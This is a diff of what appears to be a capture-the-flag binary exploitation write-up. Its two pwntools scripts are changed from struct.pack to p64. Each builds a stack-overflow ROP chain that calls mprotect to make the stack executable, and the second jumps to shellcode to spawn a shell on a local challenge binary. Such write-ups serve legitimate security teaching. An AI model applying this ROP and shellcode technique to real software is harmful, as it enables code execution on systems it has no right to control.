@@ -124,7 +124,6 @@ Using the following exploit, we can use the “attach” command into gdb in ord
 
 ~~~
 from pwn import *
-import struct
 
 p = process("./chall")
 
@@ -132,14 +131,14 @@ libc_address = 0x00007ffff7df2000
 
 payload = ""
 payload += "A" * 264
-payload += struct.pack("Q",0x00000000004011fb) # pop rdi ; ret
-payload += struct.pack("Q",0x7fffffffe000) # stack address
-payload += struct.pack("Q",0x00000000004011f9) # pop rsi ; pop r15 ; ret
-payload += struct.pack("Q",0x1000) # size
-payload += struct.pack("Q",0xAAAAAAAAAAAAAAAA) #garbage for r15
-payload += struct.pack("Q",libc_address+0x000000000003fa6a) # pop rdx ; ret
-payload += struct.pack("Q",0x7) #mode
-payload += struct.pack("Q",0x7ffff7eea1e0) # mprotect address
+payload += p64(0x00000000004011fb) # pop rdi ; ret
+payload += p64(0x7fffffffe000) # stack address
+payload += p64(0x00000000004011f9) # pop rsi ; pop r15 ; ret
+payload += p64(0x1000) # size
+payload += p64(0xAAAAAAAAAAAAAAAA) #garbage for r15
+payload += p64(libc_address+0x000000000003fa6a) # pop rdx ; ret
+payload += p64(0x7) #mode
+payload += p64(0x7ffff7eea1e0) # mprotect address
 payload += “B” * 8
 payload += "C” * 200
 raw_input()
@@ -158,7 +157,6 @@ Let’s update our script with a shellcode and try to pop a bash shell, after th
 
 ~~~
 from pwn import *
-import struct
 
 p = process("./chall")
 
@@ -167,15 +165,15 @@ libc_address = 0x00007ffff7df2000
 
 payload = ""
 payload += "A" * 264
-payload += struct.pack("Q",0x00000000004011fb) # pop rdi ; ret
-payload += struct.pack("Q",0x7fffffffe000) # stack address
-payload += struct.pack("Q",0x00000000004011f9) # pop rsi ; pop r15 ; ret
-payload += struct.pack("Q",0x1000) # size
-payload += struct.pack("Q",0xAAAAAAAAAAAAAAAA) #garbage for r15
-payload += struct.pack("Q",libc_address+0x000000000003fa6a) # pop rdx ; ret
-payload += struct.pack("Q",0x7) #mode
-payload += struct.pack("Q",0x7ffff7eea1e0) # mprotect address
-payload += struct.pack("Q",0x7fffffffe210) # shellcode address
+payload += p64(0x00000000004011fb) # pop rdi ; ret
+payload += p64(0x7fffffffe000) # stack address
+payload += p64(0x00000000004011f9) # pop rsi ; pop r15 ; ret
+payload += p64(0x1000) # size
+payload += p64(0xAAAAAAAAAAAAAAAA) #garbage for r15
+payload += p64(libc_address+0x000000000003fa6a) # pop rdx ; ret
+payload += p64(0x7) #mode
+payload += p64(0x7ffff7eea1e0) # mprotect address
+payload += p64(0x7fffffffe210) # shellcode address
 payload += shellcode
 
 p.sendline(payload)
